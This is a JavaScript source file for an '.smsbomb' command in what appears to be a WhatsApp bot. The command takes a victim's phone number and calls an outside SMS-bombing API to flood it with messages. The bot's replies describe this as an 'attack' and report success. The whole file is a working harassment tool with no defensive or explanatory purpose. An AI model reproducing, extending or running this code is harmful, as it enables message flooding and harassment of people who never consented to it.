const axios = require('axios');
const settings = require('../settings');

function onlyDigits(s = '') { 
    return String(s).replace(/\D/g, ''); 
}

module.exports = async function(sock, chatId, message, q) {
    try {
        await sock.sendMessage(chatId, { react: { text: '💣', key: message.key } });
        
        if (!q) return await sock.sendMessage(chatId, { text: '⚠️ Usage: .smsbomb <number>' }, { quoted: message });

        const target = onlyDigits(q);
        if (target.length < 10) return await sock.sendMessage(chatId, { text: '❌ Invalid number' }, { quoted: message });

        await sock.sendMessage(chatId, { 
            text: `🚀 *SHADOW PROFESSIONAL SMS BOMBER* 🚀\n\n👤 *Target:* +${target}\n📊 *Status:* Initiating Professional API Attack\n⚡ *Speed:* Multi-Threaded\n\n_System is working..._` 
        }, { quoted: message });

        // Professional SMS Bombing Implementation
        // Using multiple public APIs for maximum delivery
        const apis = [
            `https://api.siputzx.my.id/api/tools/smsbomb?number=${target}&amount=10`,
            // Add more APIs as needed
        ];

        let successCount = 0;
        let lastStatusCode = null;
        for (const api of apis) {
            try {
                const res = await axios.get(api, {
                    timeout: 15000,
                    validateStatus: () => true
                });
                lastStatusCode = res.status;
                if (res.status >= 200 && res.status < 300 && (!res.data || res.data.status !== false)) {
                    successCount++;
                }
            } catch (e) {
                console.error('SMS Bomb API error:', e.message);
            }
        }

        if (successCount > 0) {
            await sock.sendMessage(chatId, { 
                text: `✅ *SMS BOMBING COMPLETE*\n\n👤 *Target:* +${target}\n💣 *Delivery:* ${successCount}/${apis.length} API Success\n⚡ *Result:* Attack executed successfully!` 
            }, { quoted: message });
            await sock.sendMessage(chatId, { react: { text: '✅', key: message.key } });
        } else {
            const statusText = lastStatusCode ? ` (HTTP ${lastStatusCode})` : '';
            await sock.sendMessage(chatId, {
                text: `❌ SMS Bomb API unavailable${statusText}. Please try again later.`
            }, { quoted: message });
            await sock.sendMessage(chatId, { react: { text: '❌', key: message.key } });
        }

    } catch(err) { 
        console.error('SMS Bomb Error:', err);
        await sock.sendMessage(chatId, { text: '❌ Error: ' + err.message }, { quoted: message }); 
        await sock.sendMessage(chatId, { react: { text: '❌', key: message.key } });
    }
};
